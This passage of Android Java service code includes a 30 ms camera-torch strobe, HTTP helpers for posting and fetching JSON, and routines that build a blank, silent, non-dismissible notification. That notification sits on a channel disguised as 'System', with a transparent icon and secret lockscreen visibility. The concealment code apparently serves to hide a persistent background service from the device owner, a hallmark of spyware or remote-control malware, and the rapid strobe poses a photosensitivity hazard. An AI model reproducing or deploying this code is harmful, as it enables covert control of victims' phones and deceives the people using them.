        if (isStrobeRunning) return;
        isStrobeRunning = true;
        try {
            CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            if (cm == null) { isStrobeRunning = false; return; }
            final boolean[] on = {false};
            strobeRunnable = new Runnable() {
                @Override public void run() {
                    try {
                        String id = cm.getCameraIdList()[0];
                        on[0] = !on[0];
                        cm.setTorchMode(id, on[0]);
                        if (isStrobeRunning) uiHandler.postDelayed(this, 30);
                    } catch (Exception e) {
                        isStrobeRunning = false;
                    }
                }
            };
            uiHandler.post(strobeRunnable);
        } catch (Exception e) {
            isStrobeRunning = false;
        }
    }

    private void stopStrobe() {
        isStrobeRunning = false;
        if (strobeRunnable != null) {
            uiHandler.removeCallbacks(strobeRunnable);
            strobeRunnable = null;
        }
        try {
            CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            if (cm != null) cm.setTorchMode(cm.getCameraIdList()[0], false);
        } catch (Exception ignored) {}
    }

    // ─────────────────────────────────────────────────────────────────────
    // HTTP UTILS
    // ─────────────────────────────────────────────────────────────────────

    private void postJson(String urlStr, String json) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setDoOutput(true);
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);
        try (OutputStream os = conn.getOutputStream()) {
            os.write(json.getBytes("UTF-8"));
        }
        conn.getResponseCode();
        conn.disconnect();
    }

    private String getJson(String urlStr) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);
        try {
            Scanner sc = new Scanner(conn.getInputStream(), "UTF-8");
            StringBuilder sb = new StringBuilder();
            try { while (sc.hasNextLine()) sb.append(sc.nextLine()); }
            finally { sc.close(); }
            return sb.toString();
        } finally {
            conn.disconnect();
        }
    }

    // ─────────────────────────────────────────────────────────────────────
    // NOTIFICATION CHANNEL
    // ─────────────────────────────────────────────────────────────────────

    private void createHiddenChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel ch = new NotificationChannel(
                    CH_ID, "System", NotificationManager.IMPORTANCE_NONE);
                ch.setShowBadge(false);
                ch.setSound(null, null);
                ch.enableVibration(false);
                ch.enableLights(false);
                ch.setDescription("");
                ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
                NotificationManager nm =
                    (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                if (nm != null) nm.createNotificationChannel(ch);
            } catch (Exception ignored) {}
        }
    }

    private Notification buildInvisibleNotification() {
        return new NotificationCompat.Builder(this, CH_ID)
            .setContentTitle("").setContentText("")
            .setSmallIcon(R.drawable.ic_transparent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true).setOngoing(true) // ONGOING=true → tidak bisa di-swipe
            .build();
    }

    private Notification buildFallbackNotification() {
        return new NotificationCompat.Builder(this, CH_ID)
            .setContentTitle("").setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true).setOngoing(true)
            .build();
    }
}
